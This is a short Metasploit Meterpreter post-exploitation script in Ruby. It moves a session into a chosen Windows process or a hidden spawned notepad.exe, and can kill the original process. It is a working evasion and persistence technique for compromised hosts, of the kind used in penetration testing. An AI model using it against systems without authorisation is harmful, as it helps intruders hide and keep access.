# $Id$
#
# Simple example script that migrates to a specific process by name.
# This is meant as an illustration.
#

spawn = false
kill = false
target_pid = nil

opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-f" => [ false, "Launch a process and migrate into the new process"],
	"-p" => [ true , "PID to migrate to."],
	"-k" => [ false,  "Kill original process."]
)
opts.parse(args) { |opt, idx, val|
	case opt
	when "-f"
		spawn = true
	when "-k"
		kill = true
	when "-p"
		target_pid = val.to_i
	when "-h"
		print_line(opts.usage)
		raise Rex::Script::Completed
	else
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}


# Creates a temp notepad.exe to migrate to depending the architecture.
def create_temp_proc()
	sysinfo =  client.sys.config.sysinfo
	windir = client.fs.file.expand_path("%windir%")
	# Select path of executable to run depending the architecture
	if sysinfo['Architecture'] =~ /x86/
		cmd = "#{windir}\\System32\\notepad.exe"
	else
		cmd = "#{windir}\\Sysnative\\notepad.exe"
	end
	# run hidden
	proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
	return proc.pid
end

if client.platform =~ /win32|win64/
	server = client.sys.process.open
	original_pid = server.pid
	print_status("Current server process: #{server.name} (#{server.pid})")

	if spawn
		print_status("Spawning notepad.exe process to migrate to")
		target_pid = create_temp_proc
	end

	begin
		print_good("Migrating to #{target_pid}")
		client.core.migrate(target_pid)
		print_good("Successfully migrated to process #{}")
	rescue ::Exception => e
		print_error("Could not migrate in to process.")
		print_error(e)
	end

	if kill
		print_status("Killing original process with PID #{original_pid}")
		client.sys.process.kill(original_pid)
		print_good("Successfully killed process with PID #{original_pid}")
	end
end
